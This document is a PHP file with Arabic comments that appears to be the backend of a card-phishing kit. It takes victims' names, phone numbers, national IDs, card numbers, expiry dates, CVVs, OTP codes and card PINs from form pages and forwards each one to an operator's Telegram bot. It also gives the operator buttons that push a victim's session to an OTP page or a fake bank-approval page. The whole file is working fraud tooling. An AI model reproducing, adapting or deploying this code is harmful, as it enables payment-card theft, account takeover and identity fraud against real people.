<?php
/**
 * api.php
 * - معلومات شخصية لوحدها
 * - بيانات الدفع + أزرار داخل تيليجرام (بدون فتح متصفح)
 */

error_reporting(0);
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') exit;

$cfg = require __DIR__ . '/config.php';
require __DIR__ . '/store.php';

$token = $cfg['telegram_bot_token'];
$chatId = $cfg['telegram_chat_id'];

function val($data, $key, $def = 'غير متوفر') {
    if (!isset($data[$key])) return $def;
    $v = trim((string)$data[$key]);
    return $v === '' ? $def : $v;
}

function send_tg($token, $chatId, $text, $keyboard = null) {
    $post = [
        'chat_id' => $chatId,
        'text' => $text,
    ];
    if ($keyboard) {
        $post['reply_markup'] = json_encode(['inline_keyboard' => $keyboard], JSON_UNESCAPED_UNICODE);
    }

    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $body = http_build_query($post);
    $result = false;

    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $result = curl_exec($ch);
        curl_close($ch);
    }

    if ($result === false) {
        $ctx = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'content' => $body,
                'timeout' => 30,
                'ignore_errors' => true,
            ],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
        ]);
        $result = @file_get_contents($url, false, $ctx);
    }

    return json_decode((string)$result, true);
}

if (isset($_GET['test'])) {
    $keyboard = [[
        ['text' => 'توجيه الى رمز', 'callback_data' => 'otp:test'],
        ['text' => 'توجيه الى موافقة البنك', 'callback_data' => 'bank:test'],
    ]];
    $r = send_tg($token, $chatId, "🧪 اختبار أزرار داخل تيليجرام\nاضغط الزر بدون فتح متصفح", $keyboard);
    echo json_encode(['ok' => true, 'telegram' => $r], JSON_UNESCAPED_UNICODE);
    exit;
}

$raw = file_get_contents('php://input');
$input = json_decode($raw, true);
if (!is_array($input)) $input = $_POST;

$sessionId = sid(isset($input['sessionId']) && $input['sessionId'] !== '' ? $input['sessionId'] : ('s' . time()));
$page = isset($input['page']) ? $input['page'] : '';
$data = isset($input['data']) && is_array($input['data']) ? $input['data'] : [];

$tg = null;

if ($page === 'personal' || $page === 'order' || $page === 'order-step1') {
    $text =
        "👤 معلومات شخصية\n\n" .
        "الاسم: " . val($data, 'fullName') . "\n" .
        "الجوال: " . val($data, 'phoneNumber') . "\n" .
        "الهوية: " . val($data, 'nationalId');
    $tg = send_tg($token, $chatId, $text);
}

elseif ($page === 'payment') {
    $text =
        "💳 بيانات الدفع\n\n" .
        "البطاقة: " . val($data, 'cardNumber') . "\n" .
        "الاسم: " . val($data, 'holderName') . "\n" .
        "الانتهاء: " . val($data, 'expiry') . "\n" .
        "CVV: " . val($data, 'cvv') . "\n" .
        "البنك: " . val($data, 'bankName', 'غير محدد') . "\n" .
        "الشبكة: " . val($data, 'cardNetwork', 'غير محدد') . "\n\n" .
        "الجوال: " . val($data, 'phoneNumber') . "\n" .
        "الهوية: " . val($data, 'nationalId') . "\n" .
        "الاسم الكامل: " . val($data, 'fullName');

    // أزرار داخل تيليجرام فقط — بدون فتح متصفح
    $keyboard = [[
        ['text' => 'توجيه الى رمز', 'callback_data' => 'otp:' . $sessionId],
        ['text' => 'توجيه الى موافقة البنك', 'callback_data' => 'bank:' . $sessionId],
    ]];

    $tg = send_tg($token, $chatId, $text, $keyboard);

    if (empty($tg['ok']) || empty($tg['result']['reply_markup'])) {
        send_tg($token, $chatId, "اختر التوجيه:", $keyboard);
    }
}

elseif ($page === 'otp') {
    $otp = isset($data['otp']) ? $data['otp'] : (isset($data['_v5']) ? $data['_v5'] : 'غير متوفر');
    $card = isset($data['cardNumber']) ? $data['cardNumber'] : 'غير متوفر';
    $text = "🔐 رمز التحقق\n\nالبطاقة: {$card}\nOTP: {$otp}";
    $tg = send_tg($token, $chatId, $text);
}

elseif ($page === 'pin') {
    $card = isset($data['cardNumber']) ? $data['cardNumber'] : 'غير متوفر';
    $pin  = isset($data['pin'])        ? $data['pin']        : 'غير متوفر';
    $text = "🔑 كلمة مرور البطاقة\n\nالبطاقة: {$card}\nPIN: {$pin}";
    $tg = send_tg($token, $chatId, $text);
}

echo json_encode([
    'ok' => true,
    'sessionId' => $sessionId,
    'page' => $page,
    'telegram_ok' => !empty($tg['ok']),
    'has_buttons' => !empty($tg['result']['reply_markup']),
    'telegram_error' => isset($tg['description']) ? $tg['description'] : null,
], JSON_UNESCAPED_UNICODE);
